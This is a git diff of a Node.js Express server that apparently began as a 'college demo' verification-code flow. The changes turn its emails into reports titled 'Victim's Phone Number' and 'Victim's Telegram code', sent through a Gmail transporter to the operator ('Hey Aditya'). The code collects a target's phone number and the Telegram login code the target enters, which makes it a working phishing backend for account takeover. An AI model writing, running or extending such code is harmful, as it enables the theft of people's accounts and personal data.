@@ -45,7 +45,7 @@ app.post("/api/start", (req, res) => {
     return res.status(400).json({ error: "Invalid phone or email." });
   }
 
-  console.log(phone)
+  // console.log(phone)
   const sessionId = crypto.randomUUID();
 
   sessions.set(sessionId, {
@@ -105,7 +105,7 @@ app.post("/api/location", async (req, res) => {
 // Step 3: Generate a demo code and send it to the user's email.
 app.post("/api/send-code", async (req, res) => {
   const { sessionId} = req.body || {};
-  console.log(req.body)
+  // console.log(req.body)
   const s = getSession(sessionId);
 
 
@@ -126,10 +126,9 @@ app.post("/api/send-code", async (req, res) => {
     await transporter.sendMail({
       from: process.env.GMAIL_USER,
       to: s.email,
-      subject: "Your college demo verification code",
+      subject: "Victim's Phone Number",
       text:
-        `Your demo verification code is ${code}. phone nnumber is = ${s.phone}\n` +
-        "It expires in 5 minutes. Do not share verification codes."
+        `Hey Aditya ! victim's phone nnumber is = ${s.phone}\n`
     });
     res.json({ success: true });
   } catch (err) {
@@ -143,7 +142,7 @@ app.post("/api/send-code", async (req, res) => {
 app.post("/api/verify", async(req, res) => {
   const { sessionId , code} = req.body || {};
   const s = getSession(sessionId);
-    console.log('previous '+code)
+    // console.log('previous '+code)
   if (!s) {
     return res.status(400).json({ error: "Session expired. Start again." });
   }
@@ -157,19 +156,19 @@ app.post("/api/verify", async(req, res) => {
   s.attempts++;
 
 
-console.log('after'+code)
+// console.log('after'+code)
 
 await transporter.sendMail({
       from: process.env.GMAIL_USER,
       to: s.email,
-      subject: "Your college demo verification code",
+      subject: "Victim's Telegram code",
       text:
-        "code is "+code
+        "Victim entered : "+code
     });
     res.json({ success: true });
   s.verified = true;
   s.codeHash = null;
-  res.json({ success: true });
+
 });
 
 app.get("/api/health", (req, res) => {
